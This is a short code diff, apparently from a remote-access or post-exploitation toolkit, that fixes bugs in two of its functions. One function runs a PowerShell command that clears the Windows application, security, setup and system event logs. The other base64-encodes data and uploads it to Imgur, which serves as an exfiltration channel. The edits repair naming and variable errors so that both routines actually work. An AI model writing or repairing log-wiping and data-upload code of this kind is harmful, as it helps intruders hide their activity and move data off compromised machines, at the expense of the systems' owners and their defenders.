@@ -304,7 +304,7 @@ def clear_system_logs():
     """
     try:
         for log in ["application","security","setup","system"]:
-            output = powershell_exec("& { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog(\"%s\")}" % log)
+            output = powershell("& { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog(\"%s\")}" % log)
             if output:
                 log(output)
     except Exception as e:
@@ -387,8 +387,8 @@ def imgur(source, api_key=None):
     """
     import base64
     if api_key:
-        post = post('https://api.imgur.com/3/upload', headers={'Authorization': 'Client-ID {}'.format(api_key)}, data={'image': base64.b64encode(normalize(data)), 'type': 'base64'}, as_json=True)
-        return post['data']['link'].encode()
+        response = post('https://api.imgur.com/3/upload', headers={'Authorization': 'Client-ID {}'.format(api_key)}, data={'image': base64.b64encode(normalize(source)), 'type': 'base64'}, as_json=True)
+        return response['data']['link'].encode()
     else:
         log("No Imgur API key found")
 
